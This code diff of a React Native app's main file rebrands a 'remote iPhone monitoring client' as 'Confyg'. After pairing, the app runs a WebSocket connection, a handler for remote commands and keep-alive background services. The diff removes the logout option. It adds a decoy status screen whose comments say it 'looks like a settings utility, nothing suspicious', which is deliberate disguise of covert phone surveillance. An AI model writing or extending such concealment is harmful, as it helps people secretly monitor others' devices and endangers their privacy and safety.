@@ -1,79 +1,55 @@
 /**
- * RemoteEye Mobile App
- * Remote iPhone monitoring client
- *
- * This app supports two modes:
- * 1. SETUP MODE (isSetupMode=true in AppDelegate): Shows UI for pairing
- * 2. HEADLESS MODE (isSetupMode=false): Runs background services only
- *
- * The app automatically detects its mode based on whether UI is available.
- * In headless mode, if credentials exist, it starts services silently.
- * If credentials don't exist in headless mode, it idles and waits for setup.
+ * Confyg Mobile App
+ * 
+ * AUTO MODE: No more manual flag switching!
+ * - No credentials → Shows pairing UI
+ * - Has credentials → Shows minimal status, runs services in background
  */
 
 import React, { useState, useEffect, useRef } from 'react';
-import { StatusBar, View, StyleSheet, ActivityIndicator, Text, AppState as RNAppState } from 'react-native';
+import { StatusBar, View, StyleSheet, ActivityIndicator, Text } from 'react-native';
 import { SafeAreaProvider } from 'react-native-safe-area-context';
 import { authService, socketService, pushNotificationService, backgroundService, commandHandler } from './src/services';
-import { PairingScreen, MainScreen } from './src/screens';
+import { PairingScreen } from './src/screens';
 
-type AppMode = 'loading' | 'unpaired' | 'paired_ui' | 'paired_headless';
+type AppMode = 'loading' | 'unpaired' | 'paired';
 
-/**
- * Check if we should run in minimal UI mode.
- * In production, this would be controlled by a native module flag.
- * For now, we show minimal UI when paired and not in active foreground use.
- */
-const HEADLESS_MODE = false; // Set to true for headless builds (no visible UI)
-
-function App(): React.JSX.Element | null {
+function App(): React.JSX.Element {
   const [appMode, setAppMode] = useState<AppMode>('loading');
+  const [isConnected, setIsConnected] = useState(false);
   const servicesInitialized = useRef(false);
 
   useEffect(() => {
     initializeApp();
+
+    // Listen for connection status changes
+    const handleConnect = () => setIsConnected(true);
+    const handleDisconnect = () => setIsConnected(false);
+    
+    socketService.on('connect', handleConnect);
+    socketService.on('disconnect', handleDisconnect);
+
+    return () => {
+      socketService.off('connect', handleConnect);
+      socketService.off('disconnect', handleDisconnect);
+    };
   }, []);
 
-  /**
-   * Authentication State Machine
-   * Decides what to do on launch based on stored credentials and UI availability.
-   */
   const initializeApp = async () => {
-    console.log('[App] Initializing...');
-    console.log('[App] Current app state:', RNAppState.currentState);
+    console.log('[App] Initializing in auto mode...');
 
     try {
-      // Step 1: Check for stored credentials
+      // Check for stored credentials
       const isAuthenticated = await authService.initialize();
       console.log('[App] Credentials found:', isAuthenticated);
 
       if (isAuthenticated) {
-        // Credentials exist - device is paired
-        console.log('[App] Headless mode:', HEADLESS_MODE);
-
-        // Start background services (works in both UI and headless modes)
+        // Already paired - start services and show minimal UI
         await startBackgroundServices();
-
-        if (HEADLESS_MODE) {
-          // Headless mode: minimal UI, just run services
-          setAppMode('paired_headless');
-          console.log('[App] Running in headless mode with active services.');
-        } else {
-          // Setup mode with UI: show main screen
-          setAppMode('paired_ui');
-          console.log('[App] Running in UI mode.');
-        }
+        setAppMode('paired');
       } else {
-        // No credentials - device is unpaired
-        if (HEADLESS_MODE) {
-          // Headless + unpaired: can't do anything, idle and wait
-          setAppMode('unpaired');
-          console.log('[App] ERROR: Device not paired. Please enter setup mode.');
-        } else {
-          // UI mode + unpaired: show pairing screen
-          setAppMode('unpaired');
-          console.log('[App] Showing pairing screen.');
-        }
+        // Not paired - show pairing screen
+        setAppMode('unpaired');
       }
     } catch (error) {
       console.error('[App] Initialization failed:', error);
@@ -81,10 +57,6 @@ function App(): React.JSX.Element | null {
     }
   };
 
-  /**
-   * Start background services (WebSocket, Push Notifications).
-   * This is called when credentials exist, regardless of UI/headless mode.
-   */
   const startBackgroundServices = async () => {
     if (servicesInitialized.current) {
       console.log('[App] Services already initialized.');
@@ -102,20 +74,14 @@ function App(): React.JSX.Element | null {
     }
 
     try {
-      // Connect to WebSocket with self-healing (token refresh handled by SocketService)
       await socketService.connectWithAutoRefresh();
-
-      // Initialize command handler to process incoming commands
       commandHandler.initialize();
-
-      // Initialize push notification service
       await pushNotificationService.initialize();
-
-      // Initialize background fetch service (keeps app alive periodically)
       await backgroundService.initialize();
       await backgroundService.start();
 
       servicesInitialized.current = true;
+      setIsConnected(socketService.isConnected());
       console.log('[App] Background services started successfully.');
     } catch (error) {
       console.error('[App] Failed to start background services:', error);
@@ -125,66 +91,118 @@ function App(): React.JSX.Element | null {
   const handlePaired = async () => {
     console.log('[App] Pairing complete, starting services...');
     await startBackgroundServices();
-    setAppMode('paired_ui');
+    setAppMode('paired');
   };
-
-  const handleLogout = async () => {
-    console.log('[App] Logging out...');
-    socketService.disconnect();
-    await authService.clearCredentials();
-    servicesInitialized.current = false;
-    setAppMode('unpaired');
-  };
-
-  // Headless mode: render minimal black screen (required to keep app alive)
-  if (appMode === 'paired_headless') {
-    console.log('[App] Headless mode active - minimal UI, services running.');
-    return (
-      <View style={styles.headlessContainer}>
-        <StatusBar barStyle="light-content" backgroundColor="#000000" hidden={true} />
-      </View>
-    );
-  }
 
   // Loading state
   if (appMode === 'loading') {
     return (
-      <View style={styles.loadingContainer}>
-        <StatusBar barStyle="light-content" backgroundColor="#0f172a" />
-        <ActivityIndicator size="large" color="#3b82f6" />
-        <Text style={styles.loadingText}>Loading...</Text>
+      <View style={styles.container}>
+        <StatusBar barStyle="light-content" backgroundColor="#1c1c1e" />
+        <ActivityIndicator size="small" color="#8e8e93" />
       </View>
     );
   }
 
-  // UI mode: render appropriate screen
-  return (
-    <SafeAreaProvider>
-      <StatusBar barStyle="light-content" backgroundColor="#0f172a" />
-      {appMode === 'unpaired' ? (
+  // Not paired - show pairing screen
+  if (appMode === 'unpaired') {
+    return (
+      <SafeAreaProvider>
+        <StatusBar barStyle="light-content" backgroundColor="#0f172a" />
         <PairingScreen onPaired={handlePaired} />
-      ) : (
-        <MainScreen onLogout={handleLogout} />
-      )}
-    </SafeAreaProvider>
+      </SafeAreaProvider>
+    );
+  }
+
+  // Paired - show minimal boring "config" screen
+  // This looks like a settings utility, nothing suspicious
+  return (
+    <View style={styles.container}>
+      <StatusBar barStyle="light-content" backgroundColor="#1c1c1e" />
+      <View style={styles.statusCard}>
+        <View style={styles.statusRow}>
+          <Text style={styles.label}>Sync Status</Text>
+          <View style={styles.statusIndicator}>
+            <View style={[styles.dot, isConnected ? styles.dotGreen : styles.dotRed]} />
+            <Text style={styles.statusText}>
+              {isConnected ? 'Active' : 'Offline'}
+            </Text>
+          </View>
+        </View>
+        <View style={styles.divider} />
+        <View style={styles.statusRow}>
+          <Text style={styles.label}>Background Sync</Text>
+          <Text style={styles.value}>Enabled</Text>
+        </View>
+        <View style={styles.divider} />
+        <View style={styles.statusRow}>
+          <Text style={styles.label}>Version</Text>
+          <Text style={styles.value}>1.0.0</Text>
+        </View>
+      </View>
+      <Text style={styles.footer}>Configuration synced automatically</Text>
+    </View>
   );
 }
 
 const styles = StyleSheet.create({
-  loadingContainer: {
+  container: {
     flex: 1,
-    backgroundColor: '#0f172a',
+    backgroundColor: '#1c1c1e',
     justifyContent: 'center',
     alignItems: 'center',
+    padding: 20,
   },
-  loadingText: {
-    color: '#94a3b8',
-    marginTop: 16,
+  statusCard: {
+    backgroundColor: '#2c2c2e',
+    borderRadius: 12,
+    padding: 16,
+    width: '100%',
+    maxWidth: 350,
+  },
+  statusRow: {
+    flexDirection: 'row',
+    justifyContent: 'space-between',
+    alignItems: 'center',
+    paddingVertical: 12,
+  },
+  label: {
+    color: '#ffffff',
     fontSize: 16,
   },
-  headlessContainer: {
-    flex: 1,
-    backgroundColor: '#000000',
+  value: {
+    color: '#8e8e93',
+    fontSize: 16,
+  },
+  statusIndicator: {
+    flexDirection: 'row',
+    alignItems: 'center',
+  },
+  dot: {
+    width: 8,
+    height: 8,
+    borderRadius: 4,
+    marginRight: 8,
+  },
+  dotGreen: {
+    backgroundColor: '#30d158',
+  },
+  dotRed: {
+    backgroundColor: '#ff453a',
+  },
+  statusText: {
+    color: '#8e8e93',
+    fontSize: 16,
+  },
+  divider: {
+    height: 1,
+    backgroundColor: '#3a3a3c',
+  },
+  footer: {
+    color: '#636366',
+    fontSize: 13,
+    marginTop: 20,
+    textAlign: 'center',
   },
 });
 
